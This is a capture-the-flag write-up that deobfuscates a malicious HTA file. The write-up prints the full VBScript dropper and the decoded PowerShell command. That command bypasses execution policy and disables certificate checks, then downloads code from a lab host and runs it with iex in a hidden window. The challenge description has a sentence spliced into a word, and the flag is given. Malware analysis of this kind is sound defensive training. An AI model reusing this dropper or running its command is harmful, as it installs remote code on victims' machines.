---
icon: fingerprint
---

# Wanter Alive

### Challenge Description

A routine patrol through the Frontier Cluster's shadowy corners uncovered a sinister file embedded in a bounty report—one targeting Jack Colt himself. The file’s obfuscated layers suggest it's more than a simple message; it’s a weaponized codNote: Ensure all domains discovered in the challenge resolve to your Docker instance, including the appropriate port when accessing URLs.e from the Frontier Board, aiming to tighten their grip on the stars. As a trusted ally, it's your task to peel back the layers of deception trace its origin, and turn their tools against them. Every domain found in the challenge should resolve to your docker instance. Do not forget to add the port when visiting the URLs.

### Flag

`HTB{c4tch3d_th3_m4lw4r3_w1th_th3_l4ss0_9b0efc5f4cb9e70814d0abb00e6806f4}`

***

### Analysis

We are given a heavily obfuscated HTA file to solve and an IP that is useless for now. I used CyberChef to clean this up a bit to see the contents of the file.

<figure><img src="../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

From that, we can see that there is a VBScript hidden inside. But if we scroll a bit more, we can see a Powershell script encoded using Base64.

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

After decoding the Base64 string, I found a URL that is storing another VBScript file. Since the domain doesn't exist, this must be the hostname for the IP that we are given.

<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

After changing my `/etc/hosts`to use that hostname and the provided IP, I can now download the `wanted.tIF`file. It's a long file but there is one interesting part of the code where it spawns a shell.

```vb
If Not mesor() Then
        
        On Error Resume Next

        latifoliado = "U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZd2FudGVkCgXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1td2FudGVkCgTe"
        latifoliado = latifoliado & "XN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2Vydmld2FudGVkCgjZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbmNvZd2FudGVkCgGl"
        latifoliado = latifoliado & "uZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgcd2FudGVkCg3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vd2FudGVkLmFsaXZlLmh0Yi9jZGJhL19d2FudGVkCgyc"
        latifoliado = latifoliado & "CcpKSkpd2FudGVkCgd2FudGVkCg"
        
        Dim parrana
        parrana = "d2FudGVkCg"

        Dim arran
        arran =" d2FudGVkCg  d2FudGVkCg "
        arran = arran & "$d2FudGVkCgCod2FudGVkCgd"
        arran = arran & "id2FudGVkCggod2FudGVkCg "
        arran = arran & "d2FudGVkCg" & latifoliado & "d2FudGVkCg"
        arran = arran & "$d2FudGVkCgOWd2FudGVkCgj"
        arran = arran & "ud2FudGVkCgxdd2FudGVkCg "
        arran = arran & "=d2FudGVkCg [d2FudGVkCgs"
        arran = arran & "yd2FudGVkCgstd2FudGVkCge"
        arran = arran & "md2FudGVkCg.Td2FudGVkCge"
        arran = arran & "xd2FudGVkCgt.d2FudGVkCge"
        arran = arran & "nd2FudGVkCgcod2FudGVkCgd"
        arran = arran & "id2FudGVkCgngd2FudGVkCg]"
        arran = arran & ":d2FudGVkCg:Ud2FudGVkCgT"
        arran = arran & "Fd2FudGVkCg8.d2FudGVkCgG"
        arran = arran & "ed2FudGVkCgtSd2FudGVkCgt"
        arran = arran & "rd2FudGVkCgind2FudGVkCgg"
        arran = arran & "(d2FudGVkCg[sd2FudGVkCgy"
        arran = arran & "sd2FudGVkCgted2FudGVkCgm"
        arran = arran & ".d2FudGVkCgCod2FudGVkCgn"
        arran = arran & "vd2FudGVkCgerd2FudGVkCgt"
        arran = arran & "]d2FudGVkCg::d2FudGVkCgF"
        arran = arran & "rd2FudGVkCgomd2FudGVkCgb"
        arran = arran & "ad2FudGVkCgsed2FudGVkCg6"
        arran = arran & "4d2FudGVkCgStd2FudGVkCgr"
        arran = arran & "id2FudGVkCgngd2FudGVkCg("
        arran = arran & "$d2FudGVkCgcod2FudGVkCgd"
        arran = arran & "id2FudGVkCggod2FudGVkCg)"
        arran = arran & ")d2FudGVkCg;pd2FudGVkCgo"
        arran = arran & "wd2FudGVkCgerd2FudGVkCgs"
        arran = arran & "hd2FudGVkCgeld2FudGVkCgl"
        arran = arran & ".d2FudGVkCgexd2FudGVkCge"
        arran = arran & " d2FudGVkCg-wd2FudGVkCgi"
        arran = arran & "nd2FudGVkCgdod2FudGVkCgw"
        arran = arran & "sd2FudGVkCgtyd2FudGVkCgl"
        arran = arran & "ed2FudGVkCg hd2FudGVkCgi"
        arran = arran & "dd2FudGVkCgded2FudGVkCgn"
        arran = arran & " d2FudGVkCg-ed2FudGVkCgx"
        arran = arran & "ed2FudGVkCgcud2FudGVkCgt"
        arran = arran & "id2FudGVkCgond2FudGVkCgp"
        arran = arran & "od2FudGVkCglid2FudGVkCgc"
        arran = arran & "yd2FudGVkCg bd2FudGVkCgy"
        arran = arran & "pd2FudGVkCgasd2FudGVkCgs"
        arran = arran & " d2FudGVkCg-Nd2FudGVkCgo"
        arran = arran & "Pd2FudGVkCgrod2FudGVkCgf"
        arran = arran & "id2FudGVkCgled2FudGVkCg "
        arran = arran & "-d2FudGVkCgcod2FudGVkCgm"
        arran = arran & "md2FudGVkCgand2FudGVkCgd"
        arran = arran & " d2FudGVkCg$Od2FudGVkCgW"
        arran = arran & "jd2FudGVkCguxd2FudGVkCgD"
        arran = descortinar(arran, parrana, "")
            
        Dim sandareso
        sandareso = "pd2FudGVkCgo"
        sandareso = sandareso & "wd2FudGVkCgr"
        sandareso = sandareso & "sd2FudGVkCge"
        sandareso = sandareso & "ld2FudGVkCgl -cd2FudGVkCgommad2FudGVkCgnd "
        sandareso = descortinar(sandareso, parrana, "")

        sandareso = sandareso & arran

        Dim incentiva
        Set incentiva = CreateObject("WScript.Shell")
        incentiva.Run sandareso, 0, False 
        WScript.Quit(rumbo)
            
End If
```

Since I am a bit too lazy to reverse this, let's just run it with the running part removed. The value of the `sandareso` variable is yet another powershell command encoded using Base64.

<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

```
powrsell -command     $Codigo U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1tTeXN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgc3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vd2FudGVkLmFsaXZlLmh0Yi9jZGJhL19ycCcpKSkp$OWjuxd = [system.Text.encoding]::UTF8.GetString([system.Convert]::Frombase64String($codigo));powershell.exe -windowstyle hidden -executionpolicy bypass -NoProfile -command $OWjuxD
```

After decoding, we are given another URL to access.&#x20;

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

The link will give us the flag!

<figure><img src="../../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
